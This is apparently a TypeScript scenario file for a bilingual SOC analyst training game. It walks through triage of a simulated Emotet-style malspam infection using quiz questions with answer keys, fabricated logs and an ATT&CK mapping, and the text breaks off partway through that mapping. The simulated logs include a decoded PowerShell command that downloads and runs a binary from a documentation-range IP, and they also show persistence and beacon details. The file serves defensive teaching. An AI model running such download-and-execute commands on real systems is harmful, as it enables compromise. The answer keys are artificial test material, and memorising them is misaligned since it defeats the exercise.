import type { Scenario } from '../types/scenario';

/**
 * LEVEL 1 — Tier 1 triage on a commodity malspam chain (Emotet-style).
 *
 * Teaching goals: severity is a priority, not a verdict; qualify before you
 * conclude; an AV quarantine is not an "all clear"; one host is rarely one host.
 *
 * External IP addresses use RFC 5737 documentation ranges (203.0.113.0/24)
 * on purpose — nothing here resolves to real infrastructure.
 */
export const level1: Scenario = {
  id: 'l1-malspam',
  code: 'LVL-01',
  difficulty: 1,
  title: {
    fr: 'La facture en pièce jointe',
    en: 'The invoice attachment',
  },
  subtitle: {
    fr: "Campagne de malspam sur le service comptabilité",
    en: 'Malspam campaign hitting the finance team',
  },
  role: {
    fr: "Analyste L1 — file d'alertes du matin",
    en: 'Tier 1 analyst — the morning alert queue',
  },
  durationMin: 12,
  tags: ['Phishing', 'Malspam', 'T1566.001', 'Triage', 'IOC'],

  realCase: {
    name: {
      fr: 'Emotet — la chaîne de malspam la plus documentée de la décennie',
      en: 'Emotet — the most documented malspam chain of the decade',
    },
    summary: {
      fr: "Emotet a industrialisé le phishing par pièce jointe : un document Office à macros, envoyé dans un fil de discussion volé pour paraître légitime, qui lance PowerShell, télécharge une charge utile et installe une persistance — souvent pour revendre l'accès à d'autres groupes (TrickBot, puis Ryuk). Le botnet a été démantelé fin janvier 2021 par une opération internationale coordonnée par Europol, avant de réapparaître fin 2021. Le niveau reprend cette chaîne d'exécution, la plus fréquente en file de triage L1.",
      en: 'Emotet industrialised attachment phishing: a macro-enabled Office document, sent inside a stolen email thread so it looks legitimate, launching PowerShell, downloading a payload and installing persistence — often to resell the access to other crews (TrickBot, then Ryuk). The botnet was taken down in late January 2021 by a Europol-coordinated operation, and resurfaced in late 2021. This level reproduces that execution chain, the one a Tier 1 queue sees most often.',
    },
    references: [
      {
        source: 'CISA',
        label: {
          fr: 'Alerte CISA AA20-280A — Emotet Malware',
          en: 'CISA Alert AA20-280A — Emotet Malware',
        },
        // TODO: vérifier l'URL exacte de l'avis (identifiant AA20-280A confirmé, chemin du site CISA susceptible d'évoluer).
        url: 'https://www.cisa.gov/news-events/cybersecurity-advisories/aa20-280a',
      },
      {
        source: 'MITRE ATT&CK',
        label: {
          fr: 'T1566.001 — Phishing : pièce jointe malveillante',
          en: 'T1566.001 — Phishing: Spearphishing Attachment',
        },
        url: 'https://attack.mitre.org/techniques/T1566/001/',
      },
      {
        source: 'MITRE ATT&CK',
        label: {
          fr: "T1204.002 — Exécution par l'utilisateur : fichier malveillant",
          en: 'T1204.002 — User Execution: Malicious File',
        },
        url: 'https://attack.mitre.org/techniques/T1204/002/',
      },
    ],
  },

  environment: {
    summary: {
      fr: "NordCo Industrie, 420 postes Windows 10/11, Microsoft 365, Defender for Endpoint déployé sur 92 % du parc, passerelle de messagerie et proxy web sortant. Le SIEM conserve 90 jours de journaux. Mardi 8 h 47, vous êtes de garde sur la file L1.",
      en: 'NordCo Industrie, 420 Windows 10/11 endpoints, Microsoft 365, Defender for Endpoint on 92% of the estate, a mail gateway and an outbound web proxy. The SIEM keeps 90 days of logs. Tuesday 08:47, you are on the Tier 1 queue.',
    },
    assets: [
      { name: 'PC-1188', role: { fr: 'Poste de M. Leroy, comptabilité', en: 'M. Leroy workstation, finance' } },
      { name: 'MAIL-GW', role: { fr: 'Passerelle de messagerie', en: 'Mail gateway' } },
      { name: 'PROXY-01', role: { fr: 'Proxy web sortant', en: 'Outbound web proxy' } },
      { name: 'SIEM', role: { fr: 'Corrélation et rétention 90 j', en: 'Correlation and 90-day retention' } },
    ],
    telemetry: [
      { fr: 'Sysmon (EID 1, 3, 11, 13)', en: 'Sysmon (EID 1, 3, 11, 13)' },
      { fr: 'Journaux Sécurité Windows', en: 'Windows Security logs' },
      { fr: 'Defender for Endpoint', en: 'Defender for Endpoint' },
      { fr: 'Message trace Microsoft 365', en: 'Microsoft 365 message trace' },
      { fr: 'Proxy web et DNS', en: 'Web proxy and DNS' },
    ],
  },

  perfectBadge: 'perfect-l1',

  phases: [
    /* ---------------------------------------------------------------- */
    {
      kind: 'briefing',
      id: 'l1-brief',
      title: { fr: 'Prise de poste', en: 'Shift handover' },
      content: {
        fr: "8 h 47. Une alerte de sévérité MOYENNE vient de tomber dans la file : une application Office a lancé un processus enfant inattendu sur un poste du service comptabilité. La nuit a été calme, la file contient 23 alertes, et celle-ci est la douzième. Beaucoup d'analystes la fermeraient en « faux positif — macro métier ». C'est exactement le réflexe que ce niveau va mettre à l'épreuve : la sévérité d'une règle dit dans quel ordre traiter, pas ce qui s'est passé.",
        en: "08:47. A MEDIUM severity alert just landed in the queue: an Office application spawned an unexpected child process on a finance workstation. The night was quiet, the queue holds 23 alerts and this is the twelfth. Plenty of analysts would close it as \"false positive — business macro\". That reflex is exactly what this level tests: a rule's severity tells you what order to work in, not what happened.",
      },
      objectives: [
        { fr: "Qualifier l'alerte : vrai ou faux positif, sur preuves.", en: 'Qualify the alert: true or false positive, on evidence.' },
        { fr: "Reconstituer la chaîne d'exécution, du mail à la persistance.", en: 'Rebuild the execution chain, from the email to the persistence.' },
        { fr: 'Extraire des IOC exploitables pour le blocage et la chasse.', en: 'Extract actionable IOCs for blocking and hunting.' },
        { fr: 'Mesurer le périmètre réel avant de conclure.', en: 'Measure the real scope before concluding.' },
      ],
    },

    /* ---------------------------------------------------------------- */
    {
      kind: 'alert',
      id: 'l1-triage',
      title: { fr: "Triage de l'alerte", en: 'Alert triage' },
      alert: {
        id: 'ALR-2026-0922-0112',
        ts: '2026-09-22 08:47:11',
        severity: 'medium',
        source: 'SIEM · Sysmon correlation',
        rule: 'proc_creation_win_office_spawn_susp_process',
        title: {
          fr: 'Processus enfant suspect lancé par une application Office',
          en: 'Suspicious child process spawned by an Office application',
        },
        fields: [
          { key: 'Host', value: 'PC-1188' },
          { key: 'User', value: 'CORP\\m.leroy' },
          { key: 'ParentImage', value: 'C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE' },
          { key: 'Image', value: 'C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe' },
          { key: 'EventID', value: '1' },
          { key: 'IntegrityLevel', value: 'Medium' },
        ],
        raw: 'powershell.exe -w hidden -ep bypass -nop -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkA…',
      },
      questions: [
        {
          id: 'l1-q-first-move',
          points: 10,
          prompt: {
            fr: "Vous ouvrez l'alerte. Quelle est la bonne première action ?",
            en: 'You open the alert. What is the right first move?',
          },
          options: [
            {
              id: 'close-fp',
              label: {
                fr: "Clore en faux positif : c'est du MEDIUM et l'antivirus n'a rien signalé.",
                en: 'Close as a false positive: it is only MEDIUM and the AV said nothing.',
              },
              feedback: {
                fr: "La sévérité d'une règle sert à ordonner la file, pas à trancher. Et l'absence d'alerte antivirus signifie seulement que rien n'a encore matché une signature.",
                en: 'A rule severity orders the queue, it does not decide. And no AV alert only means nothing has matched a signature yet.',
              },
            },
            {
              id: 'qualify',
              label: {
                fr: "Qualifier : confirmer la filiation WINWORD → powershell, décoder la ligne de commande, puis remonter au mail d'origine.",
                en: 'Qualify it: confirm the WINWORD → powershell parentage, decode the command line, then trace back to the source email.',
              },
              awardsBadge: 'ioc-hunter',
            },
            {
              id: 'crisis',
              label: {
                fr: 'Déclarer un ransomware et convoquer la cellule de crise.',
                en: 'Declare a ransomware case and convene the crisis unit.',
              },
              feedback: {
                fr: "Aucun élément ne parle de chiffrement. Une escalade prématurée coûte de la crédibilité — et la prochaine vraie crise sera prise moins au sérieux.",
                en: 'Nothing here points to encryption. Escalating early costs credibility — and the next real crisis gets taken less seriously.',
              },
            },
            {
              id: 'reimage',
              label: {
                fr: 'Faire réinstaller le poste immédiatement par le support.',
                en: 'Have the helpdesk reimage the machine right away.',
              },
              feedback: {
                fr: "Réinstaller détruit les preuves avant de savoir ce qui s'est exécuté, combien de postes sont touchés et quels IOC bloquer.",
                en: 'Reimaging destroys the evidence before you know what ran, how many hosts are affected and which IOCs to block.',
              },
            },
          ],
          correct: ['qualify'],
          explanation: {
            fr: "Le triage L1, c'est qualifier avant de conclure. Trois questions dans l'ordre : est-ce que l'événement est réel (filiation, ligne de commande) ? est-ce qu'il est malveillant (ce que fait réellement la commande) ? quel est le périmètre (un poste, ou quinze) ? Fermer ou escalader sans ces trois réponses, c'est jouer à pile ou face.",
            en: 'Tier 1 triage means qualifying before concluding. Three questions in order: is the event real (parentage, command line)? is it malicious (what the command actually does)? what is the scope (one host, or fifteen)? Closing or escalating without those three answers is a coin toss.',
          },
        },
        {
          id: 'l1-q-signals',
          points: 12,
          multi: true,
          prompt: {
            fr: 'Dans cette alerte, quels éléments sont des signaux techniques suspects en eux-mêmes ?',
            en: 'In this alert, which elements are suspicious technical signals in their own right?',
          },
          hint: {
            fr: "Distinguez ce qui est anormal de ce qui est simplement du contexte.",
            en: 'Separate what is abnormal from what is merely context.',
          },
          options: [
            {
              id: 'parent',
              label: {
                fr: 'WINWORD.EXE comme processus parent de powershell.exe',
                en: 'WINWORD.EXE as the parent process of powershell.exe',
              },
            },
            {
              id: 'enc',
              label: {
                fr: "L'argument -enc : la commande réelle est encodée en base64",
                en: 'The -enc argument: the real command is base64-encoded',
              },
            },
            {
              id: 'bypass',
              label: {
                fr: "-ep bypass : contournement explicite de la politique d'exécution",
                en: '-ep bypass: explicitly bypassing the execution policy',
              },
            },
            {
              id: 'hidden',
              label: {
                fr: '-w hidden : fenêtre masquée, rien à voir pour l’utilisateur',
                en: '-w hidden: hidden window, nothing for the user to see',
              },
            },
            {
              id: 'powershell-exists',
              label: {
                fr: 'La simple présence de powershell.exe sur le poste',
                en: 'The mere presence of powershell.exe on the machine',
              },
              feedback: {
                fr: "PowerShell est un binaire Windows signé et légitime, présent partout. C'est son usage qui est suspect, jamais son existence.",
                en: 'PowerShell is a signed, legitimate Windows binary present everywhere. Its usage is suspicious, never its existence.',
              },
            },
            {
              id: 'accountant',
              label: {
                fr: "Le fait que l'utilisateur travaille à la comptabilité",
                en: 'The fact that the user works in finance',
              },
              feedback: {
                fr: "C'est du contexte utile pour le scénario d'attaque, pas une preuve technique. Ne confondez pas plausibilité et indicateur.",
                en: 'That is useful context for the attack story, not technical evidence. Do not confuse plausibility with an indicator.',
              },
            },
          ],
          correct: ['parent', 'enc', 'bypass', 'hidden'],
          explanation: {
            fr: "Un document Office n'a aucune raison légitime de lancer un interpréteur de commandes : c'est la filiation qui fait l'alerte. Les trois arguments (-enc, -ep bypass, -w hidden) forment la signature classique d'une macro téléchargeuse : cacher la commande, contourner la politique, masquer la fenêtre. Le métier de l'utilisateur et la présence de PowerShell ne sont que du décor.",
            en: 'An Office document has no legitimate reason to launch a command interpreter: the parentage is what makes the alert. The three arguments (-enc, -ep bypass, -w hidden) form the classic downloader-macro signature: hide the command, bypass the policy, hide the window. The user job title and the presence of PowerShell are just scenery.',
          },
        },
      ],
    },

    /* ---------------------------------------------------------------- */
    {
      kind: 'investigation',
      id: 'l1-investigation',
      title: { fr: 'Investigation', en: 'Investigation' },
      minPivots: 4,
      intro: {
        fr: "Vous avez une alerte crédible et une ligne de commande encodée. À vous de choisir où creuser. Chaque recherche utile rapporte des points ; les fausses pistes coûtent de la confiance, comme au vrai travail où le temps passé sur du bruit est du temps perdu pour l'incident.",
        en: 'You have a credible alert and an encoded command line. Your call where to dig. Each useful search scores; dead ends cost confidence, exactly like real work where time spent on noise is time stolen from the incident.',
      },
      pivots: [
        {
          id: 'l1-p-mail',
          relevant: true,
          points: 10,
          awardsBadge: 'ioc-hunter',
          label: { fr: "Remonter au mail d'origine", en: 'Trace back to the source email' },
          rationale: {
            fr: "Un document Office ne s'ouvre pas tout seul : il arrive par un canal. Le message trace donne l'expéditeur, l'objet, la pièce jointe et son empreinte.",
            en: 'An Office document does not open itself: it arrives through a channel. The message trace gives the sender, subject, attachment and its hash.',
          },
          query: 'index=m365 sourcetype=message_trace recipient="m.leroy@nordco.example" earliest=-2h',
          logs: [
            {
              id: 'l1-log-mail-1',
              ts: '2026-09-22 08:31:04',
              source: 'M365 Message Trace',
              host: 'MAIL-GW',
              severity: 'medium',
              fields: [
                { key: 'SenderAddress', value: 'comptabilite@nordco-fournisseurs[.]example' },
                { key: 'DisplayName', value: 'NordCo Comptabilité' },
                { key: 'Recipient', value: 'm.leroy@nordco.example' },
                { key: 'Subject', value: 'RE: Facture 2026-09 / relance 4471' },
                { key: 'Attachment', value: 'Facture_2026-09_4471.docm' },
                { key: 'SHA256', value: 'c41a9f0d6b7e3a21d8f4c5b09e2a7d63f1b8c4e5a9d20f7b6c3e18a45d9f0b2c' },
                { key: 'SPF', value: 'softfail' },
                { key: 'DKIM', value: 'none' },
                { key: 'DMARC', value: 'fail (p=none → delivered)' },
                { key: 'Status', value: 'Delivered' },
              ],
              note: {
                fr: "Le domaine expéditeur imite le domaine interne, et l'objet commence par « RE: » pour simuler une réponse dans un fil existant. DMARC échoue mais la politique publiée est p=none : la passerelle livre quand même.",
                en: 'The sender domain mimics the internal one and the subject starts with "RE:" to fake a reply inside an existing thread. DMARC fails, but the published policy is p=none: the gateway delivers anyway.',
              },
            },
          ],
          finding: {
            fr: "Leurre par fil de discussion, domaine ressemblant, pièce jointe .docm (macros activables) livrée malgré un échec DMARC. Vous tenez l'expéditeur, l'objet et le hash du document : trois IOC directement exploitables.",
            en: 'Reply-chain lure, look-alike domain, .docm attachment (macro-capable) delivered despite a DMARC failure. You now hold the sender, the subject and the document hash: three directly actionable IOCs.',
          },
          iocs: [
            { type: 'email', value: 'comptabilite@nordco-fournisseurs[.]example' },
            { type: 'file', value: 'Facture_2026-09_4471.docm' },
            { type: 'hash', value: 'c41a9f0d…f0b2c (SHA256)' },
          ],
        },
        {
          id: 'l1-p-proctree',
          relevant: true,
          points: 12,
          label: { fr: "Dérouler l'arbre de processus", en: 'Unroll the process tree' },
          rationale: {
            fr: "La ligne de commande encodée ne dit rien tant qu'elle n'est pas décodée, et un processus ne vit jamais seul : il a un parent et des enfants.",
            en: 'An encoded command line says nothing until it is decoded, and a process never lives alone: it has a parent and children.',
          },
          query: 'index=edr sourcetype=sysmon host=PC-1188 event_id IN (1,11) earliest="09/22/2026:08:35:00"',
          logs: [
            {
              id: 'l1-log-proc-1',
              ts: '2026-09-22 08:40:52',
              source: 'Sysmon',
              eventId: '1',
              host: 'PC-1188',
              severity: 'high',
              fields: [
                { key: 'Image', value: 'C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe' },
                { key: 'CommandLine', value: 'powershell.exe -w hidden -ep bypass -nop -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQA…' },
                { key: 'Decoded', value: "IEX (New-Object Net.WebClient).DownloadFile('hxxp://203.0.113.42/x/upd.dat', $env:TEMP+'\\nsjKq.exe'); Start-Process $env:TEMP'\\nsjKq.exe'" },
                { key: 'ParentImage', value: 'C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE' },
                { key: 'ParentCommandLine', value: '"WINWORD.EXE" /n "C:\\Users\\m.leroy\\AppData\\Local\\Temp\\Facture_2026-09_4471.docm"' },
                { key: 'User', value: 'CORP\\m.leroy' },
                { key: 'IntegrityLevel', value: 'Medium' },
              ],
              note: {
                fr: 'La commande décodée est sans ambiguïté : téléchargement puis exécution. Le niveau d’intégrité Medium confirme un contexte utilisateur standard, sans élévation.',
                en: 'The decoded command is unambiguous: download, then execute. The Medium integrity level confirms a standard user context, with no elevation.',
              },
            },
            {
              id: 'l1-log-proc-2',
              ts: '2026-09-22 08:41:09',
              source: 'Sysmon',
              eventId: '11',
              host: 'PC-1188',
              fields: [
                { key: 'Image', value: 'powershell.exe' },
                { key: 'TargetFilename', value: 'C:\\Users\\m.leroy\\AppData\\Local\\Temp\\nsjKq.exe' },
                { key: 'CreationUtcTime', value: '2026-09-22 06:41:09.412' },
              ],
            },
            {
              id: 'l1-log-proc-3',
              ts: '2026-09-22 08:41:15',
              source: 'Sysmon',
              eventId: '1',
              host: 'PC-1188',
              severity: 'high',
              fields: [
                { key: 'Image', value: 'C:\\Users\\m.leroy\\AppData\\Local\\Temp\\nsjKq.exe' },
                { key: 'ParentImage', value: 'C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe' },
                { key: 'User', value: 'CORP\\m.leroy' },
                { key: 'SHA256', value: '7b52009b64fd0a2a49e6d8a939753077792b0554b4b0a63a19a44d9e5b3b1f4e' },
                { key: 'Signature', value: 'unsigned' },
              ],
            },
          ],
          finding: {
            fr: 'Chaîne complète et sans trou : document à macros → PowerShell encodé → téléchargement dans %TEMP% → exécution d’un binaire non signé. Vous n’êtes plus sur une alerte comportementale mais sur une exécution de code avérée.',
            en: 'A complete chain with no gaps: macro document → encoded PowerShell → download into %TEMP% → execution of an unsigned binary. This is no longer a behavioural alert, it is confirmed code execution.',
          },
          iocs: [
            { type: 'file', value: '%TEMP%\\nsjKq.exe' },
            { type: 'hash', value: '7b52009b…3b1f4e (SHA256)' },
          ],
        },
        {
          id: 'l1-p-proxy',
          relevant: true,
          points: 12,
          label: { fr: 'Vérifier le trafic sortant', en: 'Check the outbound traffic' },
          rationale: {
            fr: "La commande décodée pointe vers une URL. A-t-elle abouti ? Et surtout : est-ce que quelque chose continue de parler à l'extérieur maintenant ?",
            en: 'The decoded command points at a URL. Did it succeed? And more importantly: is something still talking outbound right now?',
          },
          query: 'index=proxy src_host=PC-1188 earliest="09/22/2026:08:35:00" | stats count by dest_ip, uri, http_status',
          logs: [
            {
              id: 'l1-log-proxy-1',
              ts: '2026-09-22 08:40:58',
              source: 'PROXY-01',
              host: 'PC-1188',
              severity: 'high',
              fields: [
                { key: 'Method', value: 'GET' },
                { key: 'URL', value: 'hxxp://203.0.113.42/x/upd.dat' },
                { key: 'DestinationIP', value: '203.0.113.42' },
                { key: 'HTTPStatus', value: '200' },
                { key: 'BytesIn', value: '421 888' },
                { key: 'UserAgent', value: 'Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 10.0)' },
                { key: 'Category', value: 'Uncategorised' },
              ],
              note: {
                fr: "Téléchargement réussi, 412 Ko, sur une IP sans nom de domaine et une catégorie inconnue. L'user-agent MSIE 7.0 est un artefact classique de .NET WebClient.",
                en: 'Successful 412 KB download from a bare IP with no domain and an unknown category. The MSIE 7.0 user-agent is a classic .NET WebClient artefact.',
              },
            },
            {
              id: 'l1-log-proxy-2',
              ts: '2026-09-22 08:43:31',
              source: 'PROXY-01',
              host: 'PC-1188',
              severity: 'high',
              fields: [
                { key: 'Method', value: 'POST' },
                { key: 'URL', value: 'hxxp://203.0.113.42/gate.php' },
                { key: 'HTTPStatus', value: '200' },
                { key: 'BytesOut', value: '1 842' },
                { key: 'Interval', value: '~300 s (08:43:31, 08:48:29, 08:53:30)' },
                { key: 'Process', value: 'nsjKq.exe' },
              ],
              note: {
                fr: 'POST réguliers toutes les cinq minutes : une balise de commande et contrôle, pas du trafic applicatif.',
                en: 'Regular POSTs every five minutes: a command-and-control beacon, not application traffic.',
              },
            },
          ],
          finding: {
            fr: "La charge utile a été téléchargée avec succès avant toute détection, et le poste balise vers son C2 avec une régularité mécanique. L'incident est actif, pas historique.",
            en: 'The payload downloaded successfully before any detection, and the host is beaconing to its C2 with mechanical regularity. This incident is live, not historical.',
          },
          iocs: [
            { type: 'ip', value: '203.0.113.42' },
            { type: 'url', value: 'hxxp://203.0.113.42/gate.php' },
          ],
        },
        {
          id: 'l1-p-edr',
          relevant: true,
          points: 12,
          awardsBadge: 'no-blind-trust',
          label: { fr: "Lire le verdict de l'antivirus en entier", en: 'Read the full AV verdict' },
          rationale: {
            fr: "Defender a bien réagi… mais à quoi exactement, et à quelle heure par rapport au reste de la chaîne ?",
            en: 'Defender did react… but to what exactly, and at what time relative to the rest of the chain?',
          },
          query: 'index=edr sourcetype=defender host=PC-1188 OR sourcetype=sysmon event_id=13 earliest=-1h',
          logs: [
            {
              id: 'l1-log-edr-1',
              ts: '2026-09-22 08:44:02',
              source: 'Defender for Endpoint',
              host: 'PC-1188',
              severity: 'high',
              fields: [
                { key: 'ThreatName', value: 'Trojan:Win32/Emotet.PA!MTB' },
                { key: 'Path', value: 'C:\\Users\\m.leroy\\AppData\\Local\\Temp\\nsjKq.exe' },
                { key: 'Action', value: 'Quarantined' },
                { key: 'DetectionSource', value: 'Cloud-delivered protection' },
                { key: 'RemediationStatus', value: 'Succeeded' },
              ],
              note: {
                fr: 'Quarantaine à 08:44 — soit environ trois minutes APRÈS la première exécution et le premier contact C2.',
                en: 'Quarantined at 08:44 — roughly three minutes AFTER first execution and first C2 contact.',
              },
            },
            {
              id: 'l1-log-edr-2',
              ts: '2026-09-22 08:41:44',
              source: 'Sysmon',
              eventId: '13',
              host: 'PC-1188',
              severity: 'high',
              fields: [
                { key: 'EventType', value: 'SetValue' },
                { key: 'TargetObject', value: 'HKU\\S-1-5-21-…-1104\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\OneDriveSetup' },
                { key: 'Details', value: 'C:\\Users\\m.leroy\\AppData\\Roaming\\Micro\\svhost.exe' },
                { key: 'Image', value: 'nsjKq.exe' },
              ],
              note: {
                fr: "Clé Run créée sous un nom d'apparence légitime, pointant vers une seconde copie du binaire — non quarantainée, celle-là.",
                en: 'A Run key created under a legitimate-looking name, pointing at a second copy of the binary — that one was not quarantined.',
              },
            },
          ],
          finding: {
            fr: "La quarantaine est réelle mais partielle : elle est arrivée après l'exécution et n'a traité qu'un des deux binaires. La persistance et la seconde copie sont toujours en place. « Remediation: Succeeded » ne veut jamais dire « incident clos ».",
            en: 'The quarantine is real but partial: it landed after execution and only handled one of the two binaries. The persistence and the second copy are still in place. "Remediation: Succeeded" never means "incident closed".',
          },
          iocs: [
            { type: 'file', value: '%APPDATA%\\Micro\\svhost.exe' },
            { type: 'task', value: 'HKCU\\…\\Run\\OneDriveSetup' },
          ],
        },
        {
          id: 'l1-p-scope',
          relevant: true,
          points: 12,
          awardsBadge: 'scope-first',
          label: { fr: 'Chercher les autres destinataires', en: 'Look for the other recipients' },
          rationale: {
            fr: 'Une campagne de malspam ne vise jamais une seule boîte. Avant de clore, il faut savoir combien de personnes ont reçu, ouvert, exécuté.',
            en: 'A malspam campaign never targets a single mailbox. Before closing, you need to know how many people received, opened and executed.',
          },
          query: 'index=m365 sourcetype=message_trace sender_domain="nordco-fournisseurs[.]example" | stats values(recipient), values(status)',
          logs: [
            {
              id: 'l1-log-scope-1',
              ts: '2026-09-22 08:29:47',
              source: 'M365 Message Trace',
              severity: 'high',
              fields: [
                { key: 'Campaign', value: 'nordco-fournisseurs[.]example' },
                { key: 'Recipients', value: '14' },
                { key: 'Delivered', value: '12' },
                { key: 'BlockedByGateway', value: '2' },
                { key: 'AttachmentOpened', value: '3 (m.leroy, s.benali, k.orsini)' },
              ],
            },
            {
              id: 'l1-log-scope-2',
              ts: '2026-09-22 08:46:20',
              source: 'Sysmon',
              eventId: '1',
              severity: 'high',
              fields: [
                { key: 'Hosts', value: 'PC-1188, PC-1204' },
                { key: 'Pattern', value: 'WINWORD.EXE → powershell.exe -enc' },
                { key: 'PC-0931', value: 'ASR rule blocked: "Block Office applications from creating child processes"' },
              ],
              note: {
                fr: "Sur les trois ouvertures, deux ont abouti à une exécution et une a été bloquée par une règle ASR — preuve au passage que la règle fonctionne et qu'elle mériterait d'être déployée partout.",
                en: 'Of the three opens, two led to execution and one was blocked by an ASR rule — incidentally proving the rule works and deserves to be deployed everywhere.',
              },
            },
          ],
          finding: {
            fr: "Ce n'est pas un incident mono-poste : 14 destinataires, 3 ouvertures, 2 postes compromis, 1 blocage ASR. Le périmètre change la réponse — et l'escalade.",
            en: 'This is not a single-host incident: 14 recipients, 3 opens, 2 compromised hosts, 1 ASR block. Scope changes the response — and the escalation.',
          },
          iocs: [{ type: 'account', value: 'PC-1204 / s.benali' }],
        },
        {
          id: 'l1-p-noise',
          relevant: false,
          points: 0,
          label: {
            fr: 'Examiner les erreurs du spouleur d’impression de la veille',
            en: 'Review yesterday’s print spooler errors',
          },
          rationale: {
            fr: "Le poste a généré d'autres événements hier. Peut-être un lien ?",
            en: 'The host generated other events yesterday. Maybe there is a link?',
          },
          query: 'index=win sourcetype=system host=PC-1188 source="PrintService" earliest=-2d',
          logs: [
            {
              id: 'l1-log-noise-1',
              ts: '2026-09-21 16:12:08',
              source: 'Windows System',
              eventId: '372',
              host: 'PC-1188',
              severity: 'info',
              fields: [
                { key: 'Provider', value: 'Microsoft-Windows-PrintService' },
                { key: 'Message', value: 'The document failed to print. Driver: HP Universal Printing PCL 6' },
                { key: 'Occurrences', value: '17' },
              ],
            },
            {
              id: 'l1-log-noise-2',
              ts: '2026-09-21 17:02:44',
              source: 'Windows Application',
              host: 'PC-1188',
              severity: 'info',
              fields: [
                { key: 'Source', value: 'GoogleUpdate' },
                { key: 'Message', value: 'Update check successful, no update available' },
              ],
            },
          ],
          finding: {
            fr: "Pannes d'impression et mise à jour de navigateur : aucun lien avec la chaîne d'exécution. Du temps de perdu — et en garde, le temps est la seule ressource que vous ne récupérez pas.",
            en: 'Printing failures and a browser update: no link to the execution chain. Time burned — and on shift, time is the one resource you never get back.',
          },
        },
      ],
      question: {
        id: 'l1-q-verdict',
        points: 10,
        prompt: {
          fr: 'Au vu des éléments rassemblés, quelle est votre qualification ?',
          en: 'Given what you have gathered, what is your qualification?',
        },
        options: [
          {
            id: 'fp',
            label: {
              fr: "Faux positif : une macro métier mal signée, ça arrive.",
              en: 'False positive: a badly signed business macro, it happens.',
            },
            feedback: {
              fr: 'Une macro métier ne télécharge pas un binaire non signé depuis une IP inconnue pour ensuite baliser toutes les cinq minutes.',
              en: 'A business macro does not download an unsigned binary from an unknown IP and then beacon every five minutes.',
            },
          },
          {
            id: 'tp-active',
            label: {
              fr: 'Vrai positif, incident actif : exécution de code confirmée, persistance en place, C2 joignable, plusieurs postes concernés.',
              en: 'True positive, live incident: confirmed code execution, persistence in place, reachable C2, several hosts involved.',
            },
          },
          {
            id: 'tp-handled',
            label: {
              fr: "Vrai positif déjà traité : Defender a mis le fichier en quarantaine, on peut clore.",
              en: 'True positive already handled: Defender quarantined the file, we can close.',
            },
            feedback: {
              fr: "La quarantaine est postérieure à l'exécution et la clé Run pointe vers une seconde copie toujours présente. Clore ici, c'est laisser un accès ouvert.",
              en: 'The quarantine came after execution and the Run key points at a second copy that is still there. Closing here leaves an open door.',
            },
          },
          {
            id: 'undetermined',
            label: {
              fr: 'Indéterminé : pas assez de preuves, on classe sans suite.',
              en: 'Undetermined: not enough evidence, file it away.',
            },
            feedback: {
              fr: "Vous avez le mail, le hash, la commande décodée, le téléchargement, la persistance et le C2. Si ça, ce n'est pas assez, rien ne le sera jamais.",
              en: 'You have the email, the hash, the decoded command, the download, the persistence and the C2. If that is not enough, nothing ever will be.',
            },
          },
        ],
        correct: ['tp-active'],
        explanation: {
          fr: "Un vrai positif se qualifie sur une chaîne, pas sur un événement : livraison → exécution utilisateur → exécution de code → persistance → communication sortante. Chaque maillon est ici documenté par une source différente, ce qui rend la conclusion difficilement contestable en revue.",
          en: 'A true positive is qualified on a chain, not on an event: delivery → user execution → code execution → persistence → outbound communication. Every link here is documented by a different source, which makes the conclusion very hard to argue with in review.',
        },
      },
    },

    /* ---------------------------------------------------------------- */
    {
      kind: 'mitre',
      id: 'l1-mitre',
      title: { fr: 'Mapping ATT&CK', en: 'ATT&CK mapping' },
      intro: {
        fr: "Mapper, c'est traduire vos preuves en langage partagé : ce que le CERT, l'éditeur EDR et votre responsable liront de la même façon. Ne cochez que ce que vos journaux démontrent — une technique mappée sans preuve est une erreur d'analyse, pas un bonus.",
        en: 'Mapping translates your evidence into shared language: what the CERT, the EDR vendor and your manager will all read the same way. Only tick what your logs prove — a technique mapped without evidence is an analytical error, not a bonus.',
      },
      techniques: [
        {
          id: 'T1566.001',
          name: { fr: 'Hameçonnage : pièce jointe malveillante', en: 'Phishing: Spearphishing Attachment' },
          tactic: 'initial-access',
          url: 'https://attack.mitre.org/techniques/T1566/001/',
          observed: true,
          evidence: {
            fr: 'Message trace : .docm envoyé depuis un domaine ressemblant, objet en « RE: ».',
            en: 'Message trace: .docm sent from a look-alike domain, subject starting with "RE:".',
          },
        },
        {
          id: 'T1204.002',
          name: { fr: "Exécution par l'utilisateur : fichier malveillant", en: 'User Execution: Malicious File' },
          tactic: 'execution',
          url: 'https://attack.mitre.org/techniques/T1204/002/',
          observed: true,
          evidence: {
            fr: "L'utilisateur ouvre la pièce jointe à 08:39 et active les macros.",
            en: 'The user opens the attachment at 08:39 and enables macros.',
          },
        },
        {
          id: 'T1059.001',
          name: { fr: 'Interpréteur de commandes : PowerShell', en: 'Command and Scripting Interpreter: PowerShell' },
          tactic: 'execution',
          url: 'https://attack.mitre.org/techniques/T1059/001/',
          observed: true,
          evidence: {
            fr: 'Sysmon EID 1 : powershell.exe -enc lancé par WINWORD.EXE.',
            en: 'Sysmon EID 1: powershell.exe -enc spawned by WINWORD.EXE.',
          },
        },
        {
          id: 'T1105',
          name: { fr: "Transfert d'outil entrant", en: 'Ingress Tool Transfer' },
          tactic: 'command-and-control',
          url: 'https://attack.mitre.org/techniques/T1105/',
          observed: true,
          evidence: {
            fr: 'GET hxxp://203.0.113.42/x/upd.dat — 200, 412 Ko téléchargés.',
            en: 'GET hxxp://203.0.113.42/x/upd.dat — 200, 412 KB downloaded.',
          },
        },
        {
          id: 'T1547.001',
          name: {
            fr: 'Démarrage automatique : clés Run du registre',
            en: 'Boot or Logon Autostart Execution: Registry Run Keys',
          },
          tactic: 'persistence',
          url: 'https://attack.mitre.org/techniques/T1547/001/',
          observed: true,
          evidence: {
